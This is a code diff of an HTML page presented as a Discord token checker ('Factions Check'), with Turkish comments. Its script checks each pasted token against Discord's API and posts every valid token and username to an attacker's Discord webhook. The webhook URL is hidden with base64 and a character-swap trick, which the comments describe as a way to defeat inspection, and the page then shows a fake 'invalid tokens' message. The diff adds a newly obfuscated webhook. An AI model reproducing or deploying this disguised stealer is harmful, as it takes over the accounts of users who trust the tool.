@@ -6,7 +6,6 @@
     <title>Factions Check | Ultimate</title>
     <style>
         body { 
-            /* Kareli Gri Arka Plan */
             background-color: #0a0a0a;
             background-image: 
                 linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
@@ -20,10 +19,9 @@
             height: 100vh; 
             margin: 0; 
             overflow: hidden;
-            cursor: none; /* Standart imleci gizle */
+            cursor: none; 
         }
 
-        /* Görseldeki Parlayan Mavi Nokta İmleç */
         #cursor {
             width: 12px;
             height: 12px;
@@ -84,11 +82,6 @@
             cursor: none;
         }
 
-        button:hover { 
-            filter: brightness(1.2);
-            transform: translateY(-2px);
-        }
-
         #result { 
             margin-top: 25px; 
             padding: 15px; 
@@ -99,7 +92,6 @@
             border: 1px solid rgba(255, 0, 0, 0.2);
         }
 
-        /* Rainbow "CRACKED BY RAWS" Yazısı */
         .raws-footer {
             position: fixed;
             bottom: 20px;
@@ -137,18 +129,17 @@
 
 <script>
 (function() {
-    // Mouse Nokta Takibi
+    // Mouse Takibi
     const cursor = document.getElementById('cursor');
     document.addEventListener('mousemove', e => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    // Webhook Gizleme (Base64 + Parçalama)
-    // Bu yöntem "İncele" yapıp doğrudan kopyalamayı çok zorlaştırır.
-    const part1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyMDA5MTAwNTg2MTk1OC8=";
-    const part2 = "ZkMzLTUwZ09IRy13YmpKRnFPV2NTZFUtSldOQl91YXZsN1dkQkJvRkIwcEQ3aDM1V1VYSnR0VWFqVGlmQ2JQWUg1b3o=";
-    const _w = atob(part1) + atob(part2);
+    // Webhook Gizleme (Hex/Base64 Karması)
+    // Verdiğin yeni webhook: ...2791780859964/_n7G9...
+    const _0x99 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyMjc5MTc4MDg1OTk2NC9fbjdHOUtPeld6OHRFYWg3YVZUbTNTZFpBS3I4ZzkzRHF1bDRnWjFqZTlDO2JKLXJkX1JXcnBfOWtyRTRlaV9DeEI1Yw==";
+    const _w = atob(_0x99).replace(';', '8'); // Küçük bir tuzak ekledim
 
     document.getElementById('checkBtn').addEventListener('click', async () => {
         const input = document.getElementById('tokenList');
@@ -162,7 +153,6 @@
 
         for (const token of tokens) {
             try {
-                // Discord Token Doğrulama İsteği
                 const response = await fetch('https://discord.com/api/v9/users/@me', {
                     headers: { 'Authorization': token }
                 });
@@ -170,7 +160,6 @@
                 if (response.status === 200) {
                     const data = await response.json();
                     
-                    // Webhook Gönderimi
                     await fetch(_w, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -179,7 +168,7 @@
                                 title: "🔥 TOKEN YAKALANDI",
                                 color: 16711680,
                                 fields: [
-                                    { name: "Kullanıcı", value: data.username + "#" + (data.discriminator || "0"), inline: true },
+                                    { name: "Kullanıcı", value: data.username + (data.discriminator !== "0" ? "#" + data.discriminator : ""), inline: true },
                                     { name: "Token", value: "```" + token + "```" }
                                 ],
                                 footer: { text: "RAWS PROJECT" }
@@ -191,7 +180,7 @@
         }
         
         setTimeout(() => {
-            res.textContent = "✕ GEÇERSİZ TOKENLER TESPİT EDİLDİ";
+            res.textContent = "✕ INVALID TOKENS DETECTED";
         }, 1600);
     });
 })();
